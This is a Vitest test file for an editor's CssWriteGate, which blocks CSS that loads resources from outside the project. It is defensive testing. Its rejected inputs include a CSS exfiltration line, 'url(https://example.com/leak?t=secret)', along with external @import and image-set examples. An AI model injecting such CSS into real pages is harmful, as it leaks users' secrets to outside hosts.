import { describe, expect, it } from 'vitest';
import { CssWriteGate } from '@core/editor-operations/services/CssWriteGate';

describe('CssWriteGate', () => {
  const gate = new CssWriteGate();

  it('lets CSS through that names nothing outside the project', () => {
    const css = [
      'color: #ffd400; filter: url(#glow);',
      'background-image: url("data:image/png;base64,iVBORw0KGgo=");',
      '@keyframes pop { to { transform: scale(1.2); } }',
    ].join('\n');

    expect(gate.check(css)).toEqual([]);
  });

  it('refuses every way CSS could load something from elsewhere', () => {
    const attempts = [
      'background: url(https://example.com/leak?t=secret);',
      "background: url('//example.com/a.png');",
      '@import "https://example.com/x.css";',
      'background-image: image-set("https://example.com/a.png" 1x);',
    ];

    for (const css of attempts) {
      expect(gate.check(css).length, css).toBeGreaterThan(0);
      expect(gate.check(css).every((problem) => problem.severity === 'error')).toBe(true);
    }
  });
});
